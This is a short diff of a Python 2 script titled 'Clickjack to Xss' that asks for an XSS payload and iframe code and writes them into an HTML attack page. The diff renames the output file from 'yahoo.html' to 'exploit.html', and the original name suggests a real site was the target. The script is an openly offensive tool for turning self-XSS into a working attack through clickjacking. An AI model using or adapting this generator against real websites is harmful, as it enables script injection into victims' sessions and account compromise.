@@ -2,7 +2,7 @@ print "Clickjack to Xss"
 vector=raw_input('xss vector--> ') #xss payload
 html=raw_input('Custom Iframe Code--> ') #custom iframe code
 
-fo=open('yahoo.html','w') #creating html file 
+fo=open('exploit.html','w') #creating html file 
 
 source_code="""<html><body>
 <h1>Clickjack to exploit self xss </h1>
@@ -10,7 +10,7 @@ source_code="""<html><body>
 """%(vector)
 
 fo.write(source_code)
-fo=open('yahoo.html','a')
+fo=open('exploit.html','a')
 fo.write(html)
 fo.write('</body></html>')
 fo.close() #closing the file 
